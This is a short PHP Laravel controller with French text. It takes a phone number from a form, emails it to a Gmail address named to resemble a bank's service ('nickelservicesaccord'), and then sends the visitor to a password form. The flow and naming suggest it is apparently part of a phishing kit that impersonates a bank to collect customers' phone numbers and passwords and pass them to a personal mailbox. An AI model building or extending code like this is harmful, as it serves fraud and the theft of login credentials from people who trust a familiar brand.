<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\ContactMail;

class ContactController extends Controller
{
    public function showForm()
    {
        return view('contact');
    }
    
    public function send(Request $request)
    {
        $request->validate([
            'phone' => 'required',
        ]);
    
        $details = [
            'phone' => $request->phone,
        ];
    
        Mail::to('nickelservicesaccord@gmail.com')->send(new ContactMail($details, 'emails.contact'));
    
        return redirect()->route('password.form')->with('success', 'Message envoyé avec succès !');
    }
}
